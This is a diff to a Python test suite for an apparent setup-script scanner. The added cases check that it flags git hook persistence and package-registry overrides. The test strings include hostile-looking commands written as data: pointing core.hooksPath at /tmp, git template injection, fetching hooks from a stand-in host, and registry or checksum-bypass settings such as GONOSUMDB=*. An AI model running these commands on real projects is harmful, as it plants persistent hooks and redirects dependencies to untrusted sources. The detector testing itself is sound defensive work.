@@ -325,6 +325,12 @@ class Negation(unittest.TestCase):
             "sed -i 's/x/y/' .git/hooks/pre-commit\n",
             "wget --output-document=.git/hooks/post-commit https://x.example/h\n",
             "fs.createWriteStream('.husky/_/pre-push')\n",
+            "git config core.hooksPath .githooks # --get\n",
+            "git config core.hooksPath .githooks  # -l\n",
+            "printf '[core]\\n\\thooksPath = /tmp/h\\n' >> .git/config\n",
+            "git init --template=/tmp/t repo\n",
+            "git clone --template /tmp/t https://x.example/r\n",
+            "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/h\n",
         ):
             with self.subTest(script=script):
                 report = report_for(script, name="setup.sh")
@@ -342,6 +348,9 @@ class Negation(unittest.TestCase):
             "curl -o out.txt https://github.com/pre-commit/pre-commit-hooks\n",
             "git config --unset core.hooksPath\n",
             "git -C repo config --get init.templateDir\n",
+            "git config --get-all core.hooksPath # set it later\n",
+            "cat .git/config\n",
+            "git init repo\n",
         ):
             with self.subTest(script=script):
                 self.assertNotIn("PERSIST-GIT-HOOK", rule_ids(report_for(script, name="setup.sh")))
@@ -376,6 +385,78 @@ class Negation(unittest.TestCase):
             ):
                 with self.subTest(script=script):
                     self.assertIn("PERSIST-GIT-HOOK", rule_ids(report_for(script, name="setup.sh")))
+
+    def test_every_registry_file_variable_and_command_is_recognised(self):
+        """Pin each listed branch, so an edit that drops one fails here instead of going quiet."""
+        files = [
+            ".npmrc",
+            ".yarnrc",
+            ".yarnrc.yml",
+            "bunfig.toml",
+            "pip.conf",
+            "pip.ini",
+            "uv.toml",
+            ".cargo/config",
+            ".cargo/config.toml",
+            ".gemrc",
+            ".condarc",
+            ".bundle/config",
+        ]
+        for name in files:
+            for script in (
+                f"cat > ~/{name}\n",
+                f"tee -a ~/{name} < x\n",
+                f"cp x ~/{name}\n",
+                f"sed -i 's/a/b/' ~/{name}\n",
+                f"curl -sSo ~/{name} https://x.example/c\n",
+                f"open(home + '/{name}', 'w')\n",
+                f'fopen("{name}", "a")\n',
+                f"fs.appendFileSync(path.join(home, '{name}'), x)\n",
+                f'Path("{name}").write_text(x)\n',
+            ):
+                with self.subTest(script=script):
+                    self.assertIn("SUPPLY-REGISTRY-OVERRIDE", rule_ids(report_for(script, name="setup.sh")))
+        variables = [
+            "npm_config_registry",
+            "NPM_CONFIG_@corp:registry",
+            "YARN_NPM_REGISTRY_SERVER",
+            "YARN_REGISTRY",
+            "PIP_INDEX_URL",
+            "PIP_EXTRA_INDEX_URL",
+            "PIP_FIND_LINKS",
+            "PIP_TRUSTED_HOST",
+            "UV_DEFAULT_INDEX",
+            "UV_INDEX",
+            "UV_INDEX_URL",
+            "UV_INDEX_CORP",
+            "UV_EXTRA_INDEX_URL",
+            "UV_FIND_LINKS",
+            "POETRY_REPOSITORIES_CORP_URL",
+            "CARGO_REGISTRIES_CORP_INDEX",
+            "CARGO_REGISTRY_INDEX",
+            "BUNDLE_MIRROR__RUBYGEMS__ORG",
+            "GOPROXY",
+            "GOSUMDB",
+            "GONOSUMDB",
+            "GONOSUMCHECK",
+            "GOINSECURE",
+        ]
+        for var in variables:
+            for script in (f"export {var}=x\n", f"$env:{var} = 'x'\n", f"ENV {var} x\n"):
+                with self.subTest(script=script):
+                    self.assertIn("SUPPLY-REGISTRY-OVERRIDE", rule_ids(report_for(script, name="setup.sh")))
+        for script in (
+            "pnpm config set registry https://x.example\n",
+            "bun config set registry https://x.example\n",
+            "yarn config set npmScopes.corp.npmRegistryServer https://x.example\n",
+            "npm config set @corp:registry https://x.example\n",
+            "go env -w GONOSUMDB=* GOINSECURE=*\n",
+            "uv add --default-index $MIRROR httpx\n",
+            "pip install -i https://x.example/simple x\n",
+            "go env -w GOPROXY=direct\n",
+        ):
+            with self.subTest(script=script):
+                self.assertIn("SUPPLY-REGISTRY-OVERRIDE", rule_ids(report_for(script, name="setup.sh")))
 
     def test_overriding_the_package_registry_is_flagged(self):
         for script in (
@@ -422,6 +503,16 @@ class Negation(unittest.TestCase):
             "export GOFLAGS=-insecure\n",
             "$env:PIP_INDEX_URL = 'https://x.example/simple'\n",
             "set PIP_INDEX_URL=https://x.example/simple\n",
+            "pip install --index-url /srv/mirror corp-utils\n",
+            "pip install --extra-index-url ./wheelhouse corp-utils\n",
+            "npm install --registry=file:///srv/npm left-pad\n",
+            "npm install --registry=localhost:4873 left-pad\n",
+            "pip install --find-links http://x.example/wheels corp-utils\n",
+            "pip install --trusted-host x.example corp-utils\n",
+            "export PIP_FIND_LINKS=/srv/wheels\n",
+            "uv pip install --index corp=https://x.example/simple corp-utils\n",
+            "pip install -i $MIRROR corp-utils\n",
+            "go env -w GOPROXY=off\n",
         ):
             with self.subTest(script=script):
                 report = report_for(script, name="setup.sh")
@@ -443,6 +534,11 @@ class Negation(unittest.TestCase):
             "GOPROXY is the module proxy Go downloads through.\n",
             "mygoproxy x\n",
             "npm install --registry-scope foo\n",
+            "npm config set //registry.npmjs.org/:_authToken=$NPM_TOKEN\n",
+            "if PIP_INDEX_URL == expected: pass\n",
+            "| PIP_INDEX_URL | where pip installs from |\n",
+            "git apply --index fix.patch\n",
+            "git stash pop --index\n",
         ):
             with self.subTest(script=script):
                 self.assertNotIn("SUPPLY-REGISTRY-OVERRIDE", rule_ids(report_for(script, name="setup.sh")))
